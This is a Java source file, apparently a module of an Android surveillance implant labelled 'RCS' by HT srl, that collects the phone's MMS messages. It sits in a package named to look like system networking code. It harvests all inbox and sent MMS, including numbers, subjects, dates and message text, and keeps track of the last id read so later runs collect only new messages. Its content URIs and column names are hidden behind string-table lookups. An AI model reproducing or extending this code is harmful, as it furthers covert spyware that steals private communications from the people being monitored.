/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module.message;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.MessageFormat;
import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

public class MmsBrowser {
	private static final String TAG = "MmsBrowser"; //$NON-NLS-1$

	private final ArrayList<Mms> list;
	int maxId = 0;

	public MmsBrowser() {
		list = new ArrayList<Mms>();
	}

	// gets mms with id > minId
	public ArrayList<Mms> getMmsList(int lastParsedId) {
		maxId = lastParsedId;

		list.clear();

		// content://mms/inbox
		parse(Messages.getString("13_1"), Mms.RECEIVED, lastParsedId); //$NON-NLS-1$
		// content://mms/sent
		parse(Messages.getString("13_0"), Mms.SENT, lastParsedId); //$NON-NLS-1$

		return list;
	}

	private void parse(String content, boolean sentState, int lastManagedId) {
		// 13.2=address
		// 13.3=contact_id
		// 13.4=charset
		final String[] projection = new String[] {
				Messages.getString("13_2"), Messages.getString("13_3"), Messages.getString("13_4"), Messages.getString("13_5") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
		// 13.5=type
		// 13.6=137
		final String selection = Messages.getString("13_5") + "=" + Messages.getString("13_6"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$

		final Cursor c = Status.getAppContext().getContentResolver().query(Uri.parse(content), null, null, null, null);

		final int mmsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
			c.close();
			return;
		}

		for (int i = 0; i < mmsEntriesCount; i++) {
			String subject, number, body = null;
			long date;
			boolean sentStatus;
			int intId;

			try {
				// 13.10=_id
				final String id = c.getString(c.getColumnIndex(Messages.getString("13_10"))); //$NON-NLS-1$
				intId = Integer.parseInt(id);
				maxId = Math.max(maxId, intId);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): id = " + id); //$NON-NLS-1$
				}

				if (intId <= lastManagedId) {
					continue;
				}

				// printColumnMms(c);
				// 13.8=sub
				subject = c.getString(c.getColumnIndex(Messages.getString("13_8"))); //$NON-NLS-1$
				// 13.9=date
				String dateString = c.getString(c.getColumnIndex(Messages.getString("13_9"))).toString(); //$NON-NLS-1$
				date = Long.parseLong(dateString) * 1000; //$NON-NLS-1$

				number = extractNumber(id, projection, selection);
				body = extractBody(id);

				sentStatus = sentState;
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
				c.close();
				return;
			}

			final Mms m = new Mms(intId, number, subject, date, sentStatus, body);

			c.moveToNext();
			list.add(m);
		}
	}

	private String extractNumber(String id, String[] projection, String selection) {
		// number
		// 13.11=content://mms
		final Uri.Builder builder = Uri.parse(Messages.getString("13_11")).buildUpon(); //$NON-NLS-1$
		// 13.12=addr
		builder.appendPath(String.valueOf(id)).appendPath(Messages.getString("13_12")); //$NON-NLS-1$

		Cursor cursor1 = Status.getAppContext().getContentResolver()
				.query(builder.build(), projection, selection, null, null);

		String number;
		if (cursor1.moveToFirst() == true) {
			number = cursor1.getString(0);
			// 13.13=insert-address-token
			if (Messages.getString("13_13").equals(number)) { //$NON-NLS-1$
				number = getAddressNumber(id);
			}
		} else {
			number = ""; //$NON-NLS-1$
		}

		cursor1.close();
		cursor1 = null;

		return number;
	}

	private String extractBody(String id) {
		// multipart
		String selectionPart = "mid=" + id; //$NON-NLS-1$
		Uri uri = Uri.parse(Messages.getString("M_5")); //$NON-NLS-1$
		Cursor cursor = Status.getAppContext().getContentResolver().query(uri, null, selectionPart, null, null);
		String body = null;
		if (cursor.moveToFirst()) {
			do {
				String partId = cursor.getString(cursor.getColumnIndex("_id")); //$NON-NLS-1$
				String type = cursor.getString(cursor.getColumnIndex(Messages.getString("M_7"))); //$NON-NLS-1$
				if (Messages.getString("M_8").equals(type)) { //$NON-NLS-1$
					String data = cursor.getString(cursor.getColumnIndex(Messages.getString("M_9"))); //$NON-NLS-1$

					if (data != null) {
						// implementation of this method below
						body = getMmsText(partId);
					} else {
						body = cursor.getString(cursor.getColumnIndex(Messages.getString("M_10"))); //$NON-NLS-1$
					}
				}
			} while (cursor.moveToNext());
		}
		cursor.close();
		return body;
	}

	private void printColumnMms(final Cursor c) {
		for (int j = 0; j < c.getColumnCount(); j++) {
			final String name = c.getColumnName(j);
			final String value = c.getString(c.getColumnIndex(name));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
			}
		}
	}

	private String getMmsText(String partId) {
		Uri partURI = Uri.parse(Messages.getString("M_11") + partId); //$NON-NLS-1$
		InputStream is = null;
		StringBuilder sb = new StringBuilder();
		try {
			is = Status.getAppContext().getContentResolver().openInputStream(partURI);
			if (is != null) {
				InputStreamReader isr = new InputStreamReader(is, Messages.getString("M_12")); //$NON-NLS-1$
				BufferedReader reader = new BufferedReader(isr);
				String temp = reader.readLine();
				while (temp != null) {
					sb.append(temp);
					temp = reader.readLine();
				}
			}
		} catch (IOException e) {
		} finally {
			if (is != null) {
				try {
					is.close();
				} catch (IOException e) {
				}
			}
		}
		return sb.toString();
	}

	private String getAddressNumber(String id) {
		String selectionAdd = new String(Messages.getString("M_13")+"=" + id); //$NON-NLS-1$
		String uriStr = MessageFormat.format(Messages.getString("M_14"), id); //$NON-NLS-1$
		Uri uriAddress = Uri.parse(uriStr);
		Cursor cAdd = Status.getAppContext().getContentResolver().query(uriAddress, null, selectionAdd, null, null);
		String name = null;
		if (cAdd.moveToFirst()) {
			do {
				String number = cAdd.getString(cAdd.getColumnIndex(Messages.getString("M_15"))); //$NON-NLS-1$
				if (!Messages.getString("13_13").equals(number) && number != null) { //$NON-NLS-1$
					name = number;
				}
			} while (cAdd.moveToNext());
		}
		if (cAdd != null) {
			cAdd.close();
		}
		return name;
	}

	public int getMaxId() {
		return maxId;
	}
}
